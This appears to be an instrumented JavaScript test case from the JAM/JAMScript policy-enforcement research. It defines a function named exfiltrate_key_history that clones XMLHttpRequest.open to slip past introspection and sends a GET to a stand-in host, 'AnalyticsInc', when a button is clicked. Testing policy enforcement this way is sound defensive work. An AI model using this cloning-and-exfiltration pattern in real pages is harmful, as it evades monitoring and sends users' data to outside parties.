
JAM.startProfile('load');
function copy(obj){var v12=typeof obj;if(v12="object"!==v12)return obj;var v12=obj.valueOf(),v8=obj!=v12;if(v8)return obj=obj.constructor,JAMScript.new(obj,[v12]);v12=obj.constructor;if(v12=obj instanceof v12)v12=obj.constructor,v12=v12!==Object;if(v12){var v12=obj.constructor,v12=v12.prototype,v12=clone(v12),property;for(property in obj)if(v8=obj.hasOwnProperty(property)){var v8=v12,v3=property;introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074)var v15=obj[property];
v15=copy(v15);JAMScript.set(v8,v3,v15)}}else for(property in v12={},obj){v8=v12;v3=property;introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074)v15=obj[property];v15=copy(v15);JAMScript.set(v8,v3,v15)}return v12}function Clone(){}function clone(obj){Clone.prototype=obj;return new Clone}
function exfiltrate_key_history(){var v10=xmlhttp=new XMLHttpRequest;introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074)var v17=xmlhttp.open;v17=copy(v17);v10.opennew=v17;JAMScript.call(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone5",!0]);xmlhttp.send(null)}var v11=document.getElementById("test");JAMScript.set(v11,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
